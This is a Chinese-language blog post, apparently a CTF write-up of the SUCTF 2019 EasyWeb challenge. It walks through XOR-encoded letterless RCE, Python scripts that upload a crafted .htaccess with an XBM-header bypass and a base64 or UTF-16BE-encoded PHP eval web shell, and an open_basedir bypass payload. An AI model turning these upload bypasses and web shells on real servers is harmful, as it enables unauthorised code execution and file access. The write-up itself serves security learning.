@@ -1,0 +1,187 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>SUCTF 2019 EasyWeb_0x61-0x6F | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">SUCTF 2019 EasyWeb_0x61-0x6F</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/">2022-02-10</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>呜呜呜，我这条懒狗好长时间没刷题了，后面的日子要捡起来了。</p>
+<p>源码贴上来：</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png" alt="image-20220210150538110"></p>
+<p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p>
+<p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png" alt="image-20220210150849473"></p>
+<p>由此判断，这是无字母无数字rce，有三个思路</p>
+<p>1、异或</p>
+<p>2、取反</p>
+<p>3、自增</p>
+<p>由于这里对字符的长度有限制</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png" alt="image-20220210150949879"></p>
+<p>故采用异或。</p>
+<p>这里贴上大神的脚本</p>
+<pre><code class="php">&lt;?php
+function finds($string)&#123;
+    $index = 0;
+    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];
+    for($i=27;$i&lt;count($a);$i++)&#123;
+        for($j=27;$j&lt;count($a);$j++)&#123;
+            $x = $a[$i] ^ $a[$j];
+            for($k = 0;$k&lt;strlen($string);$k++)&#123;
+                if(ord($string[$k]) == $x)&#123;
+                    echo $string[$k].&quot;\n&quot;;
+                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;
+                    $index++;
+                    if($index == strlen($string))&#123;
+                        return 0;
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+finds(&quot;_GET&quot;);
+?&gt;
+</code></pre>
+<p>运行如图</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png" alt="image-20220210151113658"></p>
+<p>由此我们可构造payload：</p>
+<pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo
+</code></pre>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png" alt="image-20220210152555350"></p>
+<p>成功出来phpinfo，看一看有没有可以利用的点</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png" alt="image-20220210152650640"></p>
+<p>发现执行系统的命令全被禁用了，看来rce走不通了。</p>
+<p>这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png" alt="image-20220210152821670"></p>
+<p>不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。</p>
+<p>既然rce走不通，那就试一试文件上传吧</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png" alt="image-20220210152933281"></p>
+<p>各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。</p>
+<p>但是上传.htaccess仍然有<img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png" alt="image-20220210204915083"></p>
+<p>这个函数限制。</p>
+<p>解决这个函数，采用xbm格式，X Bit Map</p>
+<pre><code>在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图
+XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：
+</code></pre>
+<pre><code>#define test_width 16
+#define test_height 7
+static char test_bits[] = &#123;
+0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
+0x00, 0x60 &#125;;
+</code></pre>
+<p>在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。</p>
+<p>所以我们在.htaccess里加上</p>
+<pre><code>#define width 1337
+#define height 1337
+.....
+.....
+</code></pre>
+<p>就可以绕过绕过这个函数了。</p>
+<p>上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对&lt;?进行了检测。</p>
+<p>这里有两种方法可以绕过。</p>
+<p>1、对一句话木马的内容进行base64编码。</p>
+<p>2、使用 utf-16be 来绕过</p>
+<p>下面先附上两种方法的exp：</p>
+<p>1、</p>
+<pre><code class="python">import requests
+import base64
+
+htaccess = b&quot;&quot;&quot;
+#define width 1337
+#define height 1337 
+AddType application/x-httpd-php .ahhh
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;
+&quot;&quot;&quot;
+shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;)
+#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范
+url = &quot;http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;
+
+files = &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image/jpeg&#39;)&#125;
+data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;
+response = requests.post(url=url, data=data, files=files)
+print(response.text)
+
+files = &#123;&#39;file&#39;:(&#39;shell.ahhh&#39;,shell,&#39;image/jpeg&#39;)&#125;
+response = requests.post(url=url, data=data, files=files)
+print(response.text)
+</code></pre>
+<p>本题php环境为7.2，所以无法使用<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;shell&#39;]);&lt;/script&gt;</code>这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。</p>
+<p>得到</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png" alt="image-20220210212049717"></p>
+<p>2、</p>
+<pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;
+
+def generate_php_file(filename, script):
+    phpfile = open(filename, &#39;wb&#39;) 
+
+    phpfile.write(script.encode(&#39;utf-16be&#39;))
+    phpfile.write(SIZE_HEADER)
+
+    phpfile.close()
+
+def generate_htacess():
+    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)
+
+    htaccess.write(SIZE_HEADER)
+    htaccess.write(b&#39;AddType application/x-httpd-php .lethe\n&#39;)
+    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)
+    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)
+    htaccess.write(b&#39;php_value display_errors 1\n&#39;)
+
+    htaccess.close()
+        
+generate_htacess()
+
+generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)
+</code></pre>
+<p>同理上传即可</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png" alt="image-20220210212639842"></p>
+<p>一句话木马成功利用。</p>
+<p>使用蚁剑成功连接</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png" alt="image-20220210212824536"></p>
+<p>但是无法访问根目录。</p>
+<p>非预期解：</p>
+<p>采用蚁剑自带插件进行绕过.</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png" alt="image-20220210213427872"></p>
+<p>预期解：</p>
+<p>绕过open_basedir</p>
+<p>这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。</p>
+<pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));
+</code></pre>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png" alt="image-20220210214135619"></p>
+<p>所有文件被列举出来了，下面读取flag值就可以了。</p>
+<p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png" alt="image-20220210214447849"></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/">https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/rce/">rce</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/">内网横向代理之FRP &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
